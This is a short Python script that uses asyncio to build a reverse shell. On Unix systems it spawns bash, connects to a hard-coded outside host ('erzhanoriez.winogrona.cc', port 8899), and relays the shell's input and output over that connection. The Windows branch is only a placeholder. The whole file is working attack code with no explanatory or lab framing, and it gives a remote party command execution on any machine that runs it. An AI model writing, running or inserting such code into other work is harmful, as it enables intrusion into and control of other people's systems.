import asyncio
import sys

HOST = "erzhanoriez.winogrona.cc"
PORT = 8899

async def main_windows():
    print('Windows')

async def main_unix():
    shell = await asyncio.create_subprocess_shell("bash", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

    (reader, writer) = await asyncio.open_connection(HOST, PORT)

    async def stdin_task():
        while True:
            data = await reader.read(1024)
            shell.stdin.write(data)
        
    async def stderr_task():
        while True:
            data = await shell.stderr.read(1024)
            writer.write(data)

    async def stdout_task():
        while True:
            data = await shell.stdout.read(1024)
            writer.write(data)
    
    shell_coros = [stdin_task(), stdout_task(), stderr_task()]
    shell_tasks = [asyncio.create_task(coro) for coro in shell_coros]

    await shell.wait()
    print("Shell closed")
    for task in shell_tasks:
        task.cancel()

    reader.feed_eof()
    writer.close()

async def main():
    if sys.platform == 'win32':
        await main_windows()
    else:
        await main_unix()

if __name__ == '__main__':
    asyncio.run(main())